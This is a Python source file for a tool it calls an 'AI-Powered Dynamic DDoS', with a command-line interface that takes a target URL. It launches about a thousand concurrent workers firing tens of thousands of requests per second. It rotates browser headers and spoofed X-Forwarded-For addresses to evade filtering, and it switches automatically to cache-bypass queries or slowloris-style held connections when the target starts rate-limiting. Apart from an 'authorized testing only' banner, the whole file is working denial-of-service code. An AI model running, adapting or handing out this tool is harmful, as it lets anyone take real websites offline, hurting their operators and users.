#!/usr/bin/env python3
"""
███████████████████████████████████████████████████████████████████████
█                                                                     █
█     🧠 AI-Powered Dynamic DDoS v1.0                                █
█     🔥 Created by ouncopybara                                      █
█     ⚠️  FOR AUTHORIZED TESTING ONLY                                █
█                                                                     █
███████████████████████████████████████████████████████████████████████
"""

import asyncio
import aiohttp
import ssl
import time
import random
import sys
import argparse
import signal
from urllib.parse import urlparse, urlencode

GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
BLUE = "\033[94m"
PURPLE = "\033[95m"
RESET = "\033[0m"

TARGET_URL = ""
BASE_THREADS = 1000
BASE_RATE = 50000
DURATION = 60

stats = {
    'sent': 0,
    'failed': 0,
    'total_time': 0,
    'status_codes': {},
    'avg_response_time': 0,
    'success_rate': 100
}
stats_lock = asyncio.Lock()

current_mode = "flood"
adaptive_threads = BASE_THREADS
adaptive_rate = BASE_RATE
running = True

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15"
]

REFERERS = [
    "https://google.com/",
    "https://bing.com/",
    "https://facebook.com/",
    "https://youtube.com/",
    "https://twitter.com/"
]

def generate_random_query():
    params = {
        't': int(time.time() * 1000) + random.randint(1, 9999),
        'r': random.randint(100000, 999999),
        'v': random.choice(['1.0', '2.0', '3.0', 'latest']),
        'cache': random.choice(['true', 'false']),
        'id': random.randint(1000, 9999)
    }
    for _ in range(random.randint(1, 3)):
        params[f'x{random.randint(1, 99)}'] = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(5, 10)))
    return urlencode(params)

def generate_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': random.choice(['text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'application/json,text/html,*/*']),
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9']),
        'Accept-Encoding': 'gzip, deflate, br',
        'Referer': random.choice(REFERERS),
        'Cache-Control': random.choice(['no-cache', 'max-age=0', 'private']),
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        'DNT': random.choice(['1', '0']),
        'Connection': random.choice(['keep-alive', 'close'])
    }

def generate_body():
    methods = ['GET', 'POST', 'HEAD']
    return random.choice(methods), random.choice([
        "data=%s" % ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(10, 50))),
        "id=%d" % random.randint(1, 9999),
        "action=ping&timestamp=%d" % int(time.time()),
        "query=%s" % ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 15)))
    ])

async def ai_analyze():
    global current_mode, adaptive_threads, adaptive_rate, running
    while running:
        await asyncio.sleep(3)
        async with stats_lock:
            sent = stats['sent']
            failed = stats['failed']
            avg_time = stats['avg_response_time']
            status_codes = stats['status_codes']
        if sent == 0:
            continue
        success_rate = ((sent - failed) / sent) * 100 if sent > 0 else 100
        rate = sent / (stats['total_time'] if stats['total_time'] > 0 else 1)
        new_mode = current_mode
        new_threads = adaptive_threads
        new_rate = adaptive_rate
        if status_codes.get(429, 0) > 10 or status_codes.get(503, 0) > 10:
            if current_mode != "slowloris":
                print(f"\n{PURPLE}[AI] Switching to SLOWLORIS mode...{RESET}")
                new_mode = "slowloris"
                new_rate = max(100, adaptive_rate // 10)
        elif avg_time > 3.0 and current_mode != "bypass":
            print(f"\n{PURPLE}[AI] Switching to CACHE BYPASS mode...{RESET}")
            new_mode = "bypass"
        elif avg_time < 0.5 and success_rate > 95:
            if current_mode != "flood":
                print(f"\n{GREEN}[AI] Switching to FULL FLOOD mode...{RESET}")
                new_mode = "flood"
                new_rate = min(adaptive_rate * 1.5, 500000)
        if success_rate < 60:
            if success_rate < 40:
                new_threads = max(100, adaptive_threads // 2)
                new_rate = max(1000, adaptive_rate // 2)
                print(f"\n{YELLOW}[AI] Reducing threads to {new_threads}...{RESET}")
            else:
                new_threads = max(100, adaptive_threads - 100)
        current_mode = new_mode
        adaptive_threads = new_threads
        adaptive_rate = new_rate

async def send_request(session, url, mode, stats_lock):
    global stats
    method, body = generate_body()
    headers = generate_headers()
    if mode == "bypass":
        sep = '&' if '?' in url else '?'
        final_url = f"{url}{sep}{generate_random_query()}"
    else:
        final_url = url
    start_time = time.time()
    try:
        if method == "GET":
            async with session.get(final_url, headers=headers, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                async with stats_lock:
                    stats['sent'] += 1
                    status = resp.status
                    stats['status_codes'][status] = stats['status_codes'].get(status, 0) + 1
                    if status >= 400:
                        stats['failed'] += 1
        else:
            async with session.post(final_url, headers=headers, data=body, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                async with stats_lock:
                    stats['sent'] += 1
                    status = resp.status
                    stats['status_codes'][status] = stats['status_codes'].get(status, 0) + 1
                    if status >= 400:
                        stats['failed'] += 1
    except Exception:
        async with stats_lock:
            stats['sent'] += 1
            stats['failed'] += 1
    elapsed = time.time() - start_time
    async with stats_lock:
        stats['total_time'] += elapsed
        stats['avg_response_time'] = stats['total_time'] / stats['sent'] if stats['sent'] > 0 else 0

async def slowloris_worker(session, url):
    try:
        headers = generate_headers()
        headers['Connection'] = 'keep-alive'
        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=120)) as resp:
            await asyncio.sleep(30)
            try:
                await resp.content.read(10)
            except:
                pass
    except:
        pass

async def worker(session, url, mode, stats_lock, worker_id):
    global running, adaptive_rate, adaptive_threads
    while running:
        try:
            if mode == "slowloris":
                await slowloris_worker(session, url)
            else:
                delay = 1.0 / (adaptive_rate / adaptive_threads) if adaptive_rate > 0 else 0
                start = time.time()
                await send_request(session, url, mode, stats_lock)
                elapsed = time.time() - start
                if delay > elapsed:
                    await asyncio.sleep(delay - elapsed)
        except Exception:
            pass

async def run_attack(url, duration):
    global running, adaptive_threads, adaptive_rate, current_mode
    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, ssl=ssl.create_default_context())
    async with aiohttp.ClientSession(connector=connector) as session:
        ai_task = asyncio.create_task(ai_analyze())
        tasks = []
        for i in range(adaptive_threads):
            task = asyncio.create_task(worker(session, url, current_mode, stats_lock, i))
            tasks.append(task)
        start_time = time.time()
        print(f"{BLUE}[+] Attack running... Press Ctrl+C to stop{RESET}")
        while time.time() - start_time < duration and running:
            await asyncio.sleep(1)
            async with stats_lock:
                sent = stats['sent']
                failed = stats['failed']
                avg_time = stats['avg_response_time']
                rate = sent / (stats['total_time'] if stats['total_time'] > 0 else 1)
            print(f"\r📊 Mode: {current_mode.upper()} | Sent: {sent} | Failed: {failed} | Avg: {avg_time:.2f}s | Rate: {rate:.1f} req/s", end='')
        running = False
        ai_task.cancel()
        for t in tasks:
            t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

def signal_handler(sig, frame):
    global running
    print(f"\n{YELLOW}⏹️  Stopping...{RESET}")
    running = False

def main():
    global TARGET_URL, BASE_THREADS, BASE_RATE, DURATION, adaptive_threads, adaptive_rate
    parser = argparse.ArgumentParser(description='🧠 AI-Powered Dynamic DDoS v1.0')
    parser.add_argument('url', help='Target URL')
    parser.add_argument('-t', '--threads', type=int, default=1000, help='Initial threads (default: 1000)')
    parser.add_argument('-r', '--rate', type=int, default=50000, help='Initial rate (default: 50000 req/s)')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Duration (default: 60s)')
    args = parser.parse_args()
    TARGET_URL = args.url
    BASE_THREADS = args.threads
    BASE_RATE = args.rate
    DURATION = args.duration
    adaptive_threads = BASE_THREADS
    adaptive_rate = BASE_RATE
    print(f"""
{PURPLE}╔═══════════════════════════════════════════════════════════════╗
║     🧠 AI-Powered Dynamic DDoS v1.0                         ║
║     🔥 Created by ouncopybara                               ║
║     ⚠️  FOR AUTHORIZED TESTING ONLY                        ║
╚═══════════════════════════════════════════════════════════════╝{RESET}
    """)
    print(f"{BLUE}[+] Target: {TARGET_URL}{RESET}")
    print(f"{BLUE}[+] Initial Threads: {BASE_THREADS}{RESET}")
    print(f"{BLUE}[+] Initial Rate: {BASE_RATE} req/s{RESET}")
    print(f"{BLUE}[+] Duration: {DURATION}s{RESET}")
    signal.signal(signal.SIGINT, signal_handler)
    try:
        asyncio.run(run_attack(TARGET_URL, DURATION))
    except KeyboardInterrupt:
        print(f"\n{YELLOW}🛑 Stopped by user{RESET}")

if __name__ == "__main__":
    main()